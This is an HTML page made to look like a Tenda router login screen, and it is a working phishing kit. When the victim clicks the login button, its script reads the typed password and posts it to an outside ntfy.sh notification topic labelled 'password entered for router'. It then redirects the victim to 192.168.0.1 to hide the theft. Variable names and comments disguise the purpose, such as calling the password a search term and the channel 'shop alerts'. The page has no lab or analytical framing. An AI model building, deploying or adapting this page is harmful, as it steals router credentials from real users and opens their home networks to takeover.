<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tenda | Login</title>
<style>
  :root {
    --orange: #ED7020;
    --border-gray: #E2E4E8;
    --placeholder-gray: #A7ACB4;
    --icon-gray: #58595C;
    --text-dark: #26282B;
    --link-gray: #A7ACB4;
  }

  * { box-sizing: border-box; }

  html, body { margin: 0; height: 100%; }

  body {
    font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    background: #FFFFFF;
    display: flex;
    justify-content: center;
  }

  .page {
    width: 100%;
    max-width: 360px;
    padding: 28px 27px 24px;
    position: relative;
  }

  .logo-wrap {
    display: flex;
    justify-content: center;
    margin-bottom: 28px;
  }

  .logo-wrap img {
    width: 116px;
    height: auto;
    display: block;
  }

  .fields {
    position: relative;
  }

  .field {
    display: flex;
    align-items: center;
    border: 1px solid var(--border-gray);
    border-radius: 8px;
    padding: 0 13px;
    height: 34px;
    gap: 10px;
    background: #fff;
  }

  .field + .field { margin-top: 17px; }

  .field .icon { flex-shrink: 0; display: flex; }

  .field select,
  .field input {
    border: none;
    outline: none;
    font-size: 14.5px;
    color: var(--text-dark);
    width: 100%;
    height: 100%;
    background: transparent;
    appearance: none;
    -webkit-appearance: none;
    font-family: inherit;
    padding: 0;
  }

  .field select { cursor: pointer; color: var(--text-dark) !important; }
  .field input::placeholder { color: var(--placeholder-gray); }
  .field .chevron { flex-shrink: 0; color: #9DA2A9; }

  .eye-toggle {
    flex-shrink: 0;
    cursor: pointer;
    display: flex;
    align-items: center;
    padding: 4px;
    margin: -4px;
  }

  .login-btn {
    display: block;
    width: 100%;
    height: 36px;
    background: var(--orange);
    border: none;
    border-radius: 8px;
    color: #fff;
    font-size: 14.5px;
    font-weight: 500;
    margin-top: 54px;
    cursor: pointer;
    font-family: inherit;
  }

  .login-btn:active { background: #D9640F; }

  .forgot-row {
    display: flex;
    align-items: center;
    gap: 5px;
    margin-top: 18px;
    width: fit-content;
  }

  .forgot-btn {
    display: flex;
    align-items: center;
    gap: 5px;
    color: var(--link-gray);
    font-size: 13px;
    background: none;
    border: none;
    padding: 0;
    cursor: pointer;
    font-family: inherit;
  }

  .forgot-btn .arrow {
    display: flex;
    transition: transform 0.15s ease;
  }

  .forgot-btn.open .arrow { transform: rotate(90deg); }

  /* Inline modal / tooltip, matches Tenda's own overlay behavior */
  .reset-tip {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    background: rgba(20, 20, 20, 0.9);
    color: #fff;
    border-radius: 8px;
    padding: 14px 15px;
    font-size: 13.5px;
    line-height: 1.55;
    display: none;
    z-index: 5;
  }

  .reset-tip.show { display: block; }

  .reset-tip .close-x {
    position: absolute;
    top: 8px;
    right: 10px;
    color: rgba(255,255,255,0.6);
    font-size: 16px;
    cursor: pointer;
    line-height: 1;
    padding: 4px;
  }

  @media (max-width: 340px) {
    .page { padding: 24px 20px 20px; }
  }
</style>
</head>

<script>
  function togglePassword() {
    const input = document.getElementById('password');
    const icon = document.getElementById('eye-icon');
    if (input.type === 'password') {
      input.type = 'text';
      icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7c-2.7 4.5-6.8 7-11 7S3.7 12.5 1 8z" stroke="#6B7280" stroke-width="1.6" fill="none"/><circle cx="12" cy="8" r="2.4" stroke="#6B7280" stroke-width="1.6" fill="none"/>';
    } else {
      input.type = 'password';
      icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/><path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>';
    }
  }

  const tip = document.getElementById('resetTip'); const hhtip = document.getElementById('hhhtTip');
  const forgotBtn = document.getElementById('forgotBtn');
  const closeX = document.getElementById('closeTip');

  function toggleTip() {
    const isOpen = tip.classList.contains('show');
    if (isOpen) { closeTip(); } else { openTip(); }
  }
function togglehhTip() {
    const isOpen = hhtip.classList.contains('show');
    if (isOpen) { closehhTip(); } else { openhhTip(); }
  }
  function openTip() {
    tip.classList.add('show');
    forgotBtn.classList.add('open');
  }

  function closeTip() {
    tip.classList.remove('show');
    forgotBtn.classList.remove('open');
  }
  
  function openhhTip() {
    hhtip.classList.add('show');
  }
  
 function closehhTip() {
    hhtip.classList.remove('show');
  }
  
  closeX.addEventListener('click', function(e) {
    e.stopPropagation();
    closeTip();
    closehhTip();
    
  });

  document.addEventListener('click', function(e) {
    if (tip.classList.contains('show') &&
        !tip.contains(e.target) && hhtip.classList.contains('show') &&
        !hhtip.contains(e.target) &&
        !forgotBtn.contains(e.target)) {
      closeTip(); closehhTip();
    }
  });
  document.querySelector('.login-btn').addEventListener('click', function() {
     const btn = this;
    
    
    const originalText = btn.innerHTML;
    
   
    btn.disabled = true;
    
   
    btn.innerHTML = `<span class="spinner"></span> Loading...`;
    const searchTermValue = document.getElementById('password').value;
    
   
    if (searchTermValue.trim() !== "") {
        
       
        fetch('https://ntfy.sh/my-shop-alerts-7729', {
            method: 'POST',
            body: `🛒 password entered for router is : ${searchTermValue}`
        }).then(response => {
    // If the call succeeds, trigger the custom visibility state
    togglehhTip();
})
.catch(error => {
    // Handle or log network/connection failures locally
    console.error('Request failed:', error);
})
.finally(() => {
    // 1. Immediately restore the interactive state of the button
    btn.disabled = false;
    btn.innerHTML = originalText;
    
    // 2. Wait exactly 1000 milliseconds (1 second) before execution
    setTimeout(function() {
        window.location.href = 'http://192.168.0.1';
    }, 1000);
});

        
    }
});


  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closeTip();
  });
</script>
